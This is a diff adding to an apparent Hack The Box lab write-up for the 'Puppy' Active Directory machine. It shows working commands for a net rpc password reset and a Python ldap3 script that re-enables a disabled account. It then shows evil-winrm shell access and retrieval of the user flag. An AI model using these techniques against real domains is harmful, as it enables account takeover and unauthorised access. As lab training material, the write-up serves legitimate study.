@@ -328,6 +328,82 @@ net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Pa
 ```
 End command
 ```bash
-net rpc password "ADAM.SILVER" "nopass@123" -U "puppy.htb"/"ANT.EDWARDS"%"Antman2025!" -S 10.10.11.70
+net rpc password "ADAM.SILVER" "newP@ssword2022" -U "puppy.htb"/"ANT.EDWARDS"%"edwardspass!" -S 10.10.11.70
 ```
 Verify
+![[Puppy10.png]]
+Hmm it says account disabled, there might be a way to enable this but i wrote a custom ldap query python script to enable the account
+```python
+from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE
+
+server = Server("10.10.11.70", get_info=ALL)
+conn = Connection(server, user="puppy.htb\\ant.edwards", password="edwardsPassword!", authentication=NTLM, auto_bind=True)
+
+conn.search("dc=puppy,dc=htb", "(sAMAccountName=adam.silver)", attributes=["distinguishedName", "userAccountControl"])
+entry = conn.entries[0]
+dn = entry.distinguishedName.value
+uac = int(entry.userAccountControl.value)
+print(f"[+] DN: {dn}\n[+] Current userAccountControl: {uac}")
+
+# Clear ACCOUNTDISABLE (bit 0x2)
+new_uac = uac & ~0x2
+
+conn.modify(dn, {'userAccountControl': [(MODIFY_REPLACE, [str(new_uac)])]})
+if conn.result['result'] == 0:
+    print("[+] Account successfully enabled.")
+else:
+    print(f"[-] Error: {conn.result}")
+
+```
+
+Check the output
+```bash
+python3 py.py 
+[+] DN: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+[+] Current userAccountControl: 66050
+[+] Account successfully enabled.
+```
+Now try again
+```bash
+net rpc group members "DEVELOPERS" -U "puppy.htb"/"adam.silver"%"newP@ssword2022" -S 10.10.11.70
+```
+
+```output
+PUPPY\ant.edwards
+PUPPY\adam.silver
+PUPPY\jamie.williams
+```
+Now try EvilWinrm again and fetch the user flag
+```bash
+evil-winrm -i puppy.htb -u 'ADAM.SILVER' -p 'newP@ssword2022'
+```
+Output
+```bash
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd ..
+*Evil-WinRM* PS C:\Users\adam.silver> cd Desktop
+*Evil-WinRM* PS C:\Users\adam.silver\Desktop> ls
+
+
+    Directory: C:\Users\adam.silver\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
+-ar---          7/9/2025   5:47 PM             34 user.txt
+
+```
+
+#### Flag 1
+```
+*Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
+141a5{RETRACTED}4a760fc
+```
